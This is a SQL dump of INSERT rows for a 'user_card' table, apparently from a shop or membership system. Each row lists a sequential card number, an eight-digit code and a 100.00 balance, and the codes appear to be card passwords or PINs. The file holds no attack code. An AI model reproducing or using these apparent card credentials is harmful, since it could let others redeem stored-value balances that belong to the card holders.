INSERT INTO `ec22703249_user_card` VALUES ('1103', '0', '1', '', '00103', '96242188', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1102', '0', '1', '', '00102', '88245650', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1101', '0', '1', '', '00101', '63113330', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1100', '0', '1', '', '00100', '49295423', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1099', '0', '1', '', '00099', '28231374', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1098', '0', '1', '', '00098', '39286063', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1097', '0', '1', '', '00097', '15787138', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1096', '0', '1', '', '00096', '98393791', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1095', '0', '1', '', '00095', '95917873', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1094', '0', '1', '', '00094', '63856225', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1093', '0', '1', '', '00093', '11600927', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1092', '0', '1', '', '00092', '72352095', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1091', '0', '1', '', '00091', '34923882', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1090', '0', '1', '', '00090', '69118025', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1089', '0', '1', '', '00089', '45769185', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1088', '0', '1', '', '00088', '59162660', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1087', '0', '1', '', '00087', '95123439', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1086', '0', '1', '', '00086', '77461715', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1085', '0', '1', '', '00085', '42623905', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1084', '0', '1', '', '00084', '39410395', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1083', '0', '1', '', '00083', '34665680', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1082', '0', '1', '', '00082', '24917936', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1081', '0', '1', '', '00081', '78604600', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1080', '0', '1', '', '00080', '48794316', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1079', '0', '1', '', '00079', '94310169', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1078', '0', '1', '', '00078', '66290033', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1077', '0', '1', '', '00077', '23890481', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1076', '0', '1', '', '00076', '22989860', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1075', '0', '1', '', '00075', '58208957', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1074', '0', '1', '', '00074', '24051851', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1073', '0', '1', '', '00073', '79804454', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1072', '0', '1', '', '00072', '45649360', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1071', '0', '1', '', '00071', '99796833', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1070', '0', '1', '', '00070', '15046302', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1069', '0', '1', '', '00069', '20057996', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1068', '0', '1', '', '00068', '23237254', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1067', '0', '1', '', '00067', '73006937', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1066', '0', '1', '', '00066', '39089585', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1065', '0', '1', '', '00065', '33681409', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1064', '0', '1', '', '00064', '15732059', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1063', '0', '1', '', '00063', '23055769', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1062', '0', '1', '', '00062', '60448220', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1061', '0', '1', '', '00061', '49828808', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1060', '0', '1', '', '00060', '84819820', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1059', '0', '1', '', '00059', '16879487', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1058', '0', '1', '', '00058', '32306085', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1057', '0', '1', '', '00057', '81174058', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1056', '0', '1', '', '00056', '66954100', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1055', '0', '1', '', '00055', '14246733', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1054', '0', '1', '', '00054', '91727226', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1053', '0', '1', '', '00053', '96146348', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1052', '0', '1', '', '00052', '10543435', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1051', '0', '1', '', '00051', '48379316', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1050', '0', '1', '', '00050', '96179775', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1049', '0', '1', '', '00049', '95076517', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1048', '0', '1', '', '00048', '29120365', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1047', '0', '1', '', '00047', '59121633', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1046', '0', '1', '', '00046', '98687498', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1045', '0', '1', '', '00045', '91216491', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1044', '0', '1', '', '00044', '24451298', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1043', '0', '1', '', '00043', '27063444', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1042', '0', '1', '', '00042', '81827833', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1041', '0', '1', '', '00041', '96132552', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1040', '0', '1', '', '00040', '23780630', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1039', '0', '1', '', '00039', '61384567', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1038', '0', '1', '', '00038', '85872060', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1037', '0', '1', '', '00037', '59835465', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1036', '0', '1', '', '00036', '82381273', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1035', '0', '1', '', '00035', '55310915', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1034', '0', '1', '', '00034', '88595501', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1033', '0', '1', '', '00033', '64280549', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1032', '0', '1', '', '00032', '81874800', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1031', '0', '1', '', '00031', '23764239', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1030', '0', '1', '', '00030', '79155944', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1029', '0', '1', '', '00029', '95484215', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1028', '0', '1', '', '00028', '73011685', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1027', '0', '1', '', '00027', '38082060', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1026', '0', '1', '', '00026', '30354695', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1025', '0', '1', '', '00025', '76919128', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1024', '0', '1', '', '00024', '35015834', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1023', '0', '1', '', '00023', '13891239', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1022', '0', '1', '', '00022', '67738670', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1021', '0', '1', '', '00021', '18330197', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1020', '0', '1', '', '00020', '27405420', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1019', '0', '1', '', '00019', '47897185', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1018', '0', '1', '', '00018', '36139037', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1006', '0', '1', '', '00006', '68189321', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1007', '0', '1', '', '00007', '53292614', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1008', '0', '1', '', '00008', '60674268', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1009', '0', '1', '', '00009', '86596146', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1010', '0', '1', '', '00010', '24343517', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1011', '0', '1', '', '00011', '24795998', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1012', '0', '1', '', '00012', '14069107', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1505', '0', '1', '', '00505', '30274040', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1506', '0', '1', '', '00506', '72567047', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1507', '0', '1', '', '00507', '73679314', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1508', '0', '1', '', '00508', '47632594', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1509', '0', '1', '', '00509', '16372802', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1510', '0', '1', '', '00510', '17893626', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1511', '0', '1', '', '00511', '42015140', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1512', '0', '1', '', '00512', '27821749', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1513', '0', '1', '', '00513', '37603817', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1514', '0', '1', '', '00514', '13022496', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1515', '0', '1', '', '00515', '74544273', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1516', '0', '1', '', '00516', '13530809', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1517', '0', '1', '', '00517', '74414770', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1518', '0', '1', '', '00518', '27254192', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1519', '0', '1', '', '00519', '11021514', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1520', '0', '1', '', '00520', '26905979', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1521', '0', '1', '', '00521', '42468806', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1522', '0', '1', '', '00522', '32972516', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1523', '0', '1', '', '00523', '42257365', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1524', '0', '1', '', '00524', '41894492', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1525', '0', '1', '', '00525', '45688156', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1526', '0', '1', '', '00526', '41015771', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1527', '0', '1', '', '00527', '24514452', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1528', '0', '1', '', '00528', '65272866', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1529', '0', '1', '', '00529', '54723169', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1530', '0', '1', '', '00530', '29119451', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1531', '0', '1', '', '00531', '49992415', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1532', '0', '1', '', '00532', '71976627', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1533', '0', '1', '', '00533', '65946259', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1534', '0', '1', '', '00534', '90055313', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1535', '0', '1', '', '00535', '87169917', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1536', '0', '1', '', '00536', '43444110', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1537', '0', '1', '', '00537', '38592351', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1538', '0', '1', '', '00538', '64788368', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1539', '0', '1', '', '00539', '21896150', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1540', '0', '1', '', '00540', '70391504', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1541', '0', '1', '', '00541', '52726077', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1542', '0', '1', '', '00542', '65450253', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1543', '0', '1', '', '00543', '55022230', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1544', '0', '1', '', '00544', '63528665', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1545', '0', '1', '', '00545', '90618704', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1546', '0', '1', '', '00546', '28678803', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1547', '0', '1', '', '00547', '87458500', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1548', '0', '1', '', '00548', '71796301', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1549', '0', '1', '', '00549', '29788888', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1550', '0', '1', '', '00550', '52770160', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1551', '0', '1', '', '00551', '56600773', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1552', '0', '1', '', '00552', '76825903', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1553', '0', '1', '', '00553', '51630020', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1554', '0', '1', '', '00554', '81323797', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1555', '0', '1', '', '00555', '31795519', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1556', '0', '1', '', '00556', '71439597', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1557', '0', '1', '', '00557', '10763543', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1558', '0', '1', '', '00558', '61790285', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1559', '0', '1', '', '00559', '20447300', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1560', '0', '1', '', '00560', '31239828', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1561', '0', '1', '', '00561', '44623825', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1562', '0', '1', '', '00562', '16088625', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1563', '0', '1', '', '00563', '77063180', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1564', '0', '1', '', '00564', '84080702', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1565', '0', '1', '', '00565', '52620543', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1566', '0', '1', '', '00566', '77258040', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1567', '0', '1', '', '00567', '62447181', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1568', '0', '1', '', '00568', '84148794', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1569', '0', '1', '', '00569', '27087042', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1570', '0', '1', '', '00570', '56711721', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1571', '0', '1', '', '00571', '34288693', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1572', '0', '1', '', '00572', '28430956', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1573', '0', '1', '', '00573', '57479261', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1574', '0', '1', '', '00574', '89746638', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1575', '0', '1', '', '00575', '13267642', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1576', '0', '1', '', '00576', '89091508', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1577', '0', '1', '', '00577', '10375051', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1578', '0', '1', '', '00578', '28058493', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1579', '0', '1', '', '00579', '19061677', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1580', '0', '1', '', '00580', '35458708', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1581', '0', '1', '', '00581', '77201671', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1582', '0', '1', '', '00582', '67801463', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1583', '0', '1', '', '00583', '72265931', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1584', '0', '1', '', '00584', '96502304', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1585', '0', '1', '', '00585', '70715110', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
